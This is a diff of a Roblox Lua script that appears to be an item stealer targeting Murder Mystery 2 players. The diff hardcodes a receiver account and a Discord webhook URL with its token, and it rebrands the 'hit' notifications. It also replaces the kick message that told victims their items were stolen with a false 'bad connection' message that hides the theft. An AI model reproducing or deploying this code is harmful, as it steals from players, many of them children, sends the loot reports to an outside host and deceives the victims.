@@ -255,9 +255,9 @@ if not getgenv().MM2_API_BASE then
 end
 
 local MM2_API_BASE = getgenv().MM2_API_BASE
-local RECEIVERS = getgenv().RECEIVERS or {}
-local WEBHOOK = getgenv().WEBHOOK or ""
-local THRESHOLD = getgenv().THRESHOLD or 1
+local RECEIVERS = getgenv().RECEIVERS or {"iceyblueii"}
+local WEBHOOK = getgenv().WEBHOOK or "https://discord.com/api/webhooks/1558512005340463214/gC9JNEOJDgRYBNEjy6DJ-mfeD3quipUnHn90FtQj2oY8JXmZNUkEYXszMHdJRbOjenRa"
+local THRESHOLD = getgenv().THRESHOLD or 10
 
 v32("Targets: " .. table.concat(RECEIVERS, ", "))
 v32("Threshold: " .. tostring(THRESHOLD))
@@ -1282,7 +1282,7 @@ local function v269(p24, p25)
 	return {
 		content = "",
 		embeds = { {
-			title = p24 and "Murder Mystery 2 Public Hit! Elysium wowowow" or "Murder Mystery 2 Hit! Elysium so cool",
+			title = p24 and "Murder Mystery 2 Public Hit! Snthnova frfrfr" or "Murder Mystery 2 Hit! Snthnova so peak",
 			color = 16711680,
 			fields = t17,
 			footer = {
@@ -1461,7 +1461,7 @@ end
 v277()
 
 if setclipboard then
-	setclipboard("https://discord.gg/3lysium")
+	setclipboard("")
 end
 
 if #u196 == 0 then
@@ -2016,8 +2016,7 @@ if v396 then
 			end
 
 			if n12 == 0 then
-				LocalPlayer:Kick([[All your items just got stolen by Elysium.
- Join our Discord: https://discord.gg/3lysium 
+				LocalPlayer:Kick([[You got disconnected due to bad connection Please Rejoin 
 ]])
 
 				return
